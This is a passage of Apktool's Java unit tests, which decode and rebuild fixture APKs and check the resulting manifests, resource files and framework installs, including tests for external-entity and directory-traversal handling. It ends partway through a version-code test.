`brut.apktool/apktool-lib/src/test/java/brut/androlib/Empty9PatchTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class Empty9PatchTest extends BaseTest {
    private static final String TEST_APK = "empty_9patch.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(Empty9PatchTest.class, "empty_9patch", sTmpDir);
    }

    @Test
    public void decodeWithEmpty9PatchFile() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        File aPng = new File(testDir, "res/drawable-xhdpi/empty.9.png");
        assertTrue(aPng.isFile());
        assertEquals(0, aPng.length());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/EmptyArscTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class EmptyArscTest extends BaseTest {
    private static final String TEST_APK = "issue2701.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(EmptyArscTest.class, "issue2701", sTmpDir);
    }

    @Test
    public void decodeWithEmptyArscFile() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/values/public.xml").isFile());
        assertTrue(new File(testDir, "AndroidManifest.xml").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/EmptyResourcesArscTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class EmptyResourcesArscTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue1730-orig");
        sTestNewDir = new File(sTmpDir, "issue1730-new");

        log("Unpacking issue1730.apk...");
        copyResourceDir(EmptyResourcesArscTest.class, "issue1730", sTestOrigDir);

        log("Decoding issue1730.apk...");
        File testApk = new File(sTestOrigDir, "issue1730.apk");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);

        log("Building issue1730.apk...");
        new ApkBuilder(sTestNewDir, sConfig).build(testApk);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ExternalEntityTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class ExternalEntityTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "doctype-orig");
        sTestNewDir = new File(sTmpDir, "doctype-new");

        log("Unpacking doctype...");
        copyResourceDir(ExternalEntityTest.class, "doctype", sTestOrigDir);

        log("Building doctype.apk...");
        File testApk = new File(sTmpDir, "doctype.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding doctype.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void doctypeTest() throws Exception {
        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<manifest hardwareAccelerated=\"true\" package=\"com.ibotpeaches.doctype\" platformBuildVersionCode=\"24\" platformBuildVersionName=\"6.0-2456767\"\n"
          + "  xmlns:android=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <supports-screens android:anyDensity=\"true\" android:smallScreens=\"true\" android:normalScreens=\"true\" android:largeScreens=\"true\" android:resizeable=\"true\" android:xlargeScreens=\"true\" />\n"
          + "</manifest>";

        String obtained = readTextFile(new File(sTestNewDir, "AndroidManifest.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/FrameworkTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.res.Framework;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class FrameworkTest extends BaseTest {
    private static final String FRAMEWORK_APK = "framework.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(FrameworkTest.class, "framework", sTmpDir);
    }

    @Test
    public void isFrameworkTaggingWorking() throws Exception {
        sConfig.setFrameworkDirectory(sTmpDir.getAbsolutePath());
        sConfig.setFrameworkTag("building");

        File frameApk = new File(sTmpDir, FRAMEWORK_APK);
        new Framework(sConfig).install(frameApk);

        assertTrue(new File(sTmpDir, "2-building.apk").exists());
    }

    @Test
    public void isFrameworkInstallingWorking() throws Exception {
        sConfig.setFrameworkDirectory(sTmpDir.getAbsolutePath());

        File frameApk = new File(sTmpDir, FRAMEWORK_APK);
        new Framework(sConfig).install(frameApk);

        assertTrue(new File(sTmpDir, "2.apk").exists());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/LargeCompactResourceTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.xml.XmlUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class LargeCompactResourceTest extends BaseTest {
    private static final String TEST_APK = "issue3705.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(CompactResourceTest.class, "issue3705", sTmpDir);
    }

    @Test
    public void checkIfDecodeSucceeds() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        Document doc = XmlUtils.loadDocument(new File(testDir, "res/values/strings.xml"));
        String expression = "/resources/string[contains(@name, 'APKTOOL')]";
        NodeList nodes = XmlUtils.evaluateXPath(doc, expression, NodeList.class);
        assertEquals(0, nodes.getLength());

        new ApkBuilder(testDir, sConfig).build(null);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/LargeIntsInManifestTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class LargeIntsInManifestTest extends BaseTest {
    private static final String TEST_APK = "issue767.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(LargeIntsInManifestTest.class, "issue767", sTmpDir);
    }

    @Test
    public void checkIfLargeIntsAreHandledTest() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        new ApkBuilder(testDir, sConfig).build(null);

        File newApk = new File(testDir, "dist/" + testApk.getName());
        File newDir = new File(testApk + ".out.new");
        new ApkDecoder(newApk, sConfig).decode(newDir);

        compareXmlFiles(testDir, newDir, "AndroidManifest.xml");
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/MinifiedArscTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class MinifiedArscTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(MinifiedArscTest.class, "issue1157", sTmpDir);

        File testApk = new File(sTmpDir, "issue1157.apk");
        sTestNewDir = new File(testApk + ".out");

        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void checkIfMinifiedArscLayoutFileMatchesTest() throws Exception {
        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<LinearLayout n1:orientation=\"vertical\" n1:layout_width=\"match_parent\" n1:layout_height=\"match_parent\" xmlns:n1=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <com.ibotpeaches.issue1157.MyCustomView n1:max=\"100\" n2:default_value=\"1.0\" n2:max_value=\"5.0\" n2:min_value=\"0.2\" xmlns:n2=\"http://schemas.android.com/apk/res-auto\" />\n"
          + "</LinearLayout>";

        String obtained = readTextFile(new File(sTestNewDir, "res/xml/custom.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/MissingVersionManifestTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class MissingVersionManifestTest extends BaseTest {
    private static final String TEST_APK = "issue1264.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(MissingVersionManifestTest.class, "issue1264", sTmpDir);
    }

    @Test
    public void missingVersionParsesCorrectlyTest() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        ApkInfo testInfo = ApkInfo.load(testDir);
        assertNull(testInfo.getVersionInfo().getVersionName());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/NetworkConfigTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.xml.XmlUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class NetworkConfigTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "network_config-orig");
        sTestNewDir = new File(sTmpDir, "network_config-new");

        log("Unpacking network_config...");
        copyResourceDir(NetworkConfigTest.class, "network_config/existing", sTestOrigDir);

        sConfig.setNetSecConf(true);

        log("Building network_config.apk...");
        File testApk = new File(sTmpDir, "network_config.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding network_config.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void netSecConfGeneric() throws Exception {
        log("Verifying network security configuration file contains user and system certificates...");

        // Load the XML document
        Document doc = XmlUtils.loadDocument(new File(sTestNewDir, "res/xml/network_security_config.xml"));

        // Check if 'system' certificate exists
        String systemCertExpr = "/network-security-config/base-config/trust-anchors/certificates[@src='system']";
        NodeList systemCertNodes = XmlUtils.evaluateXPath(doc, systemCertExpr, NodeList.class);
        assertTrue(systemCertNodes.getLength() > 0);

        // Check if 'user' certificate exists
        String userCertExpr = "/network-security-config/base-config/trust-anchors/certificates[@src='user']";
        NodeList userCertNodes = XmlUtils.evaluateXPath(doc, userCertExpr, NodeList.class);
        assertTrue(userCertNodes.getLength() > 0);
    }

    @Test
    public void netSecConfInManifest() throws Exception {
        log("Validating network security config in Manifest...");

        // Load the XML document
        Document doc = XmlUtils.loadDocument(new File(sTestNewDir, "AndroidManifest.xml"));

        // Check if network security config attribute is set correctly
        Node application = doc.getElementsByTagName("application").item(0);
        NamedNodeMap attrs = application.getAttributes();
        Node netSecConfAttr = attrs.getNamedItem("android:networkSecurityConfig");
        assertEquals("@xml/network_security_config", netSecConfAttr.getNodeValue());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/NoNetworkConfigTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.xml.XmlUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class NoNetworkConfigTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "network_config-orig");
        sTestNewDir = new File(sTmpDir, "network_config-new");

        log("Unpacking network_config...");
        copyResourceDir(NoNetworkConfigTest.class, "network_config/none", sTestOrigDir);

        sConfig.setNetSecConf(true);

        log("Building network_config.apk...");
        File testApk = new File(sTmpDir, "network_config.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(testApk);

        log("Decoding network_config.apk...");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void netSecConfGeneric() throws Exception {
        log("Comparing network security configuration file...");

        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<network-security-config>\n"
          + "    <base-config>\n"
          + "        <trust-anchors>\n"
          + "            <certificates src=\"system\"/>\n"
          + "            <certificates src=\"user\"/>\n"
          + "        </trust-anchors>\n"
          + "    </base-config>\n"
          + "</network-security-config>";

        String obtained = readTextFile(new File(sTestNewDir, "res/xml/network_security_config.xml"));

        assertXMLEqual(expected, obtained);
    }

    @Test
    public void netSecConfInManifest() throws Exception {
        log("Validating network security config in Manifest...");

        // Load the XML document
        Document doc = XmlUtils.loadDocument(new File(sTestNewDir, "AndroidManifest.xml"));

        // Check if network security config attribute is set correctly
        Node application = doc.getElementsByTagName("application").item(0);
        NamedNodeMap attrs = application.getAttributes();
        Node netSecConfAttr = attrs.getNamedItem("android:networkSecurityConfig");
        assertEquals("@xml/network_security_config", netSecConfAttr.getNodeValue());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/NonStandardPkgIdTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;
import brut.androlib.res.ResDecoder;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResTable;
import brut.directory.ExtFile;
import brut.util.OS;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class NonStandardPkgIdTest extends BaseTest {
    private static ExtFile sTestApk;
    private static ResTable sTable;

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "pkgid8-orig");
        sTestNewDir = new File(sTmpDir, "pkgid8-new");

        log("Unpacking pkgid8...");
        copyResourceDir(NonStandardPkgIdTest.class, "pkgid8", sTestOrigDir);

        sConfig.setVerbose(true);

        log("Building pkgid8.apk...");
        sTestApk = new ExtFile(sTmpDir, "pkgid8.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(sTestApk);

        log("Decoding pkgid8.apk...");
        ApkInfo testInfo = new ApkInfo();
        testInfo.setApkFile(sTestApk);
        ResDecoder resDecoder = new ResDecoder(testInfo, sConfig);
        OS.mkdir(sTestNewDir);
        resDecoder.decodeResources(sTestNewDir);
        resDecoder.decodeManifest(sTestNewDir);
        sTable = resDecoder.getTable();
    }

    @AfterClass
    public static void afterClass() throws Exception {
        sTestApk.close();
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void valuesStringsTest() throws Exception {
        compareValuesFiles("values/strings.xml");
    }

    @Test
    public void confirmManifestStructureTest() throws Exception {
        compareXmlFiles("AndroidManifest.xml");
    }

    @Test
    public void confirmResourcesAreFromPkgId8() throws Exception {
        assertEquals(0x80, sTable.getMainPackage().getId());

        assertEquals(0x80, sTable.resolve(ResId.of(0x80020000)).getPackage().getId());
        assertEquals(0x80, sTable.resolve(ResId.of(0x80020001)).getPackage().getId());
        assertEquals(0x80, sTable.resolve(ResId.of(0x80030000)).getPackage().getId());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/OutsideOfDirectoryEntryTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class OutsideOfDirectoryEntryTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(OutsideOfDirectoryEntryTest.class, "issue1589", sTmpDir);

        File testApk = new File(sTmpDir, "issue1589.apk");
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);
        sTestNewDir = testDir;
    }

    @Test
    public void skippedDecodingOfInvalidFileTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertFalse(new File(sTestNewDir, "assets").isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ParentDirectoryTraversalTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class ParentDirectoryTraversalTest extends BaseTest {
    private static final String apk = "issue1498.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(ParentDirectoryTraversalTest.class, "issue1498", sTmpDir);
    }

    @Test
    public void checkIfDrawableFileDecodesProperly() throws Exception {
        sConfig.setDecodeResources(Config.DecodeResources.NONE);

        File testApk = new File(sTmpDir, apk);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ProtectedChunksTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class ProtectedChunksTest extends BaseTest {
    private static final String TEST_APK = "protected_chunks.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(ProtectedChunksTest.class, "protected_chunks", sTmpDir);
    }

    @Test
    public void checkIfDecodeWorksWithoutCrash() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/values/strings.xml").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ProviderAttributeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class ProviderAttributeTest extends BaseTest {
    private static final String TEST_APK = "issue636.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(ProviderAttributeTest.class, "issue636", sTmpDir);
    }

    @Test
    public void isProviderStringReplacementWorking() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        new ApkBuilder(testDir, sConfig).build(null);

        File newApk = new File(testDir, "dist/" + testApk.getName());
        File newDir = new File(testApk + ".out.new");
        new ApkDecoder(newApk, sConfig).decode(newDir);

        String expected =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
          + "<manifest package=\"com.ibotpeaches.issue636\" platformBuildVersionCode=\"22\" platformBuildVersionName=\"5.1-1756733\"\n"
          + "  xmlns:android=\"http://schemas.android.com/apk/res/android\">\n"
          + "    <application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\">\n"
          + "        <provider android:authorities=\"com.ibotpeaches.issue636.Provider\" android:exported=\"false\" android:grantUriPermissions=\"true\" android:label=\"@string/app_name\" android:multiprocess=\"false\" android:name=\"com.ibotpeaches.issue636.Provider\"/>\n"
          + "        <provider android:authorities=\"com.ibotpeaches.issue636.ProviderTwo\" android:exported=\"false\" android:grantUriPermissions=\"true\" android:label=\"@string/app_name\" android:multiprocess=\"false\" android:name=\"com.ibotpeaches.issue636.ProviderTwo\"/>\n"
          + "    </application>\n"
          + "</manifest>";

        String obtained = readTextFile(new File(newDir, "AndroidManifest.xml"));

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ReferenceVersionCodeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class ReferenceVersionCodeTest extends BaseTest {
    private static final String TEST_APK = "issue1234.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(ReferenceVersionCodeTest.class, "issue1234", sTmpDir);
    }

    @Test
    public void referenceBecomesLiteralTest() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        ApkInfo testInfo = ApkInfo.load(testDir);
